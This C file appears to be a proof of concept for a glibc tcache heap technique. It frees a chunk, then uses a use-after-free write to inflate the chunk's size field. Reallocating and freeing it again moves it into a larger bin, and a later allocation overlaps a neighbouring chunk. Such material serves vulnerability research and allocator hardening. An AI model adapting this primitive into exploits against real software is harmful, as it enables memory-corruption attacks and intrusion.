/*
 * after-free-tcache.c - Extending free chunks, sleeping corruption, tcache variant
 *
 * Demonstrates overlapping inflating a FREE chunk's SIZE and retrieving it.
 *
 * Mechanism:
 *   1. Allocate p1 | p2 | p3 | guard
 *   2. free(p2) -> tcache[0x20]
 *   3. Corrupt: inflate p2 SIZE (0x21 -> 0x51)
 *   4. malloc(0x18) -> tcache_get -> p2, SIZE=0x51 survives (no set_head)
 *   5. free(p2) -> chunksize=0x50 -> tc_idx for 0x50 -> tcache_put to wrong bin
 *   6. malloc(0x48) -> tcache[0x50] -> p2 with 0x50-byte claim -> overlaps p3
 *
 * Key: tcache_put only writes key+next at user-data offsets, the chunk
 * header (including SIZE field at mem-8) is never touched.
 *
 * Build: G=./glibc/build/install
 *   gcc -g -o poc poc.c -Wl,-rpath,$G/lib -Wl,--dynamic-linker=$G/lib/ld-linux-aarch64.so.1
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define TC 16

int main(void) {
    printf("\nExtending Free --- Sleeping corruption --- tcache-only (glibc 2.43)\n\n");

    long *p1 = malloc(0x18);    /* chunk 0x20 */
    long *p2 = malloc(0x18);    /* chunk 0x20 -- victim */
    long *p3 = malloc(0x38);    /* chunk 0x40 -- overlap target */
    long *guard = malloc(0x18);

    printf("p1=%p p2=%p p3=%p guard=%p\n", (void*)p1,(void*)p2,(void*)p3,(void*)guard);

    /* Step 1: free p2 -> tcache[0x20] */
    printf("\n[1] free(p2) -> tcache[0x20]\n");
    free(p2);

    /* Step 2: Corruption inflate SIZE. tcache_put leaves header untouched. */
    size_t *p2size = (size_t*)((char*)p2 - 8);
    printf("[2] UAF: p2 SIZE 0x%zx -> 0x51\n", *p2size);
    *p2size = 0x51;

    /* Step 3: tcache_get -> p2, SIZE=0x51 survives (no set_head in tcache_get) */
    printf("[3] malloc(0x18) -> tcache_get\n");
    long *ret = malloc(0x18);
    printf("    ret=%p %s  (SIZE=0x%zx)\n", (void*)ret, ret==p2? "OK!" : "NOPE!", *p2size);

    /* Step 4: free(ret) with inflated chunksize -> wrong tcache bin */
    printf("[4] free(ret) -> chunksize=0x50 -> tcache[0x50]\n");
    free(ret);

    /* Step 5: malloc(0x48) -> tcache[0x50] -> p2 -> overlaps p3 */
    printf("[5] malloc(0x48) -> tcache_get\n");
    long *overlap = malloc(0x48);
    printf("    overlap=%p %s\n", (void*)overlap, overlap==p2? "OK!" : "NOPE!");

    /* Prove overlap: p3 (p2+0x20) is inside the 0x50-byte claim */
    memset(overlap, 'X', 0x48);
    printf("[6] Wrote 0x48 bytes. p3=%016lx  %s\n",
           *(uint64_t*)p3,
           *(uint64_t*)p3 == 0x5858585858585858ULL ? "OK! OVERLAP!" : "NOPE!");

    free(overlap);
    free(p1);
    free(guard);

    printf("[+] Done!\n");
    return 0;
}
